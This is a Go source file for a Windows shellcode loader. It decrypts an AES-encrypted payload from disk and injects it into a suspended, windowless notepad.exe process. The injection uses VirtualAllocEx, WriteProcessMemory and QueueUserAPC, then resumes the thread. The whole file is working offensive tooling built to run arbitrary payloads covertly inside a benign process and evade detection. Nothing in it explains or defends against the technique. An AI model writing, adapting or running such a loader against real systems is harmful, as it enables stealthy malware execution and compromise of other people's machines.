package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"goloader/utils"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {

	shellCodeFlag := flag.String("e", "Encrypted shellcode", "Path of the AES 256 Encrypted shellcode")
	base64_aeskey := flag.String("k", "Key", "Value of the Base64 AES 256 key")
	flag.Parse()

	shellcodePath := *shellCodeFlag
	base64_blob := *base64_aeskey
	key, err := base64.StdEncoding.DecodeString(base64_blob)
	if err != nil {
		fmt.Println("[-] Error decoding key: ", err)
		return
	}

	encryptedShellcode, err := os.ReadFile(shellcodePath)
	if err != nil {
		fmt.Println("[-] Error opening file: ", err)
		return
	}

	// key := make([]byte, 32)

	// _, err = rand.Reader.Read(key)
	// if err != nil {
	// 	fmt.Println("[-] Error generating random encryption key: ", err)
	// }

	// encryptedShellcode, err := utils.EncryptSC(rawShellcode, key)
	// if err != nil {
	// 	fmt.Println("[-] Error encrypting file: ", err)
	// 	return
	// }

	// fmt.Println("[]byte{")
	// for i := 0; i < len(decoded); i++ {
	// 	if i == len(decoded)-1 {
	// 		fmt.Println(decoded[i], "}")
	// 	} else {
	// 		fmt.Print(decoded[i], ", ")
	// 	}
	// }

	commandLine := "notepad.exe"

	creationFlags := uint32(windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW)

	var si windows.StartupInfo
	var pi windows.ProcessInformation

	si.Cb = uint32(unsafe.Sizeof(si))

	commandLinePtr := windows.StringToUTF16Ptr(string(commandLine))

	processCreate := windows.CreateProcess(
		nil,            // lpApplicationName
		commandLinePtr, // lpCommandLine
		nil,            // lpProcessAttributes
		nil,            // lpThreadAttributes
		false,          // bInheritHandles
		creationFlags,  // dwCreationFlags
		nil,            // lpEnvironment
		nil,            // lpCurrentDirectory
		&si,            // lpStartupInfo
		&pi,            // lpProcessInformation
	)

	if processCreate != nil {
		fmt.Printf("Error creating process: %v\n", err)
		return
	}

	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	actualShellCode, err := utils.DecryptSC(encryptedShellcode, []byte(key))
	if err != nil {
		fmt.Println("[-] Error decrypting shellcode: ", err)
		return
	}

	KERNELDLL := windows.NewLazyDLL("kernel32.dll")

	procVirtualAllocEx := KERNELDLL.NewProc("VirtualAllocEx")

	addr, _, err := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(0),
		uintptr(len(actualShellCode)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_EXECUTE_READ))

	if addr == 0 {
		fmt.Println("[-] Error allocating memory: ", err)
		return
	}

	var buffer uintptr

	err = windows.WriteProcessMemory(
		pi.Process,
		uintptr(addr),
		&actualShellCode[0],
		uintptr(len(actualShellCode)),
		&buffer)
	if err != nil {
		fmt.Println("[-] Error writing process memory: ", err)
		return
	}
	procQueueUserAPC := KERNELDLL.NewProc("QueueUserAPC")
	success1, _, lastErr := procQueueUserAPC.Call(addr, uintptr(pi.Thread), 0)
	if success1 == 0 {
		fmt.Printf("Error queueing user APC: %v\n", lastErr)
	}

	_, err = windows.ResumeThread(windows.Handle(pi.Thread))
	if err != nil {
		fmt.Printf("Error resuming thread: %v\n", err)
		windows.CloseHandle(pi.Process)
		windows.CloseHandle(pi.Thread)
		return
	}

}
